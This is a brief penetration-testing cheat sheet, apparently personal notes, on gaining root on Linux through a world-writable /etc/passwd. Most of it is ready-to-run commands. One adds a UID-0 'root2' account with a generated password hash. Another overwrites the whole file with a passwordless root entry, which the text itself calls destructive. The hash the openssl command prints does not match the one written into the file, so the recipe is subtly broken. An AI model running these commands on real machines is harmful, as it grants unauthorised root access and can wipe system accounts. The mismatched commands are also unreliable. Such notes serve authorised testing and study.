# Insecure File Permissions 

## Overview

Writable configuration files, scripts, directories, or system binaries can sometimes be modified by non-privileged users. If these files are executed or used by privileged processes, they may provide a path to privilege escalation.

---
Writing to /etc/passwd
```
openssl passwd -1 -salt aaa password1
$1$aaa$6DRsJ7YjB6dCLeJnrzqvm0
echo "root2:\$1\$aaa\$2gZh60XPpDSkkMhy5ZfQ71:0:0:test:/root:/bin/bash" >> /etc/passwd
```
Or we can remove the 'x' and doing so remove the password (more destructive method)
```
echo 'root::0:0:root:/root:/bin/bash' > /etc/passwd
su
```

To overwrite /etc/shadow see Sunday (HTB)

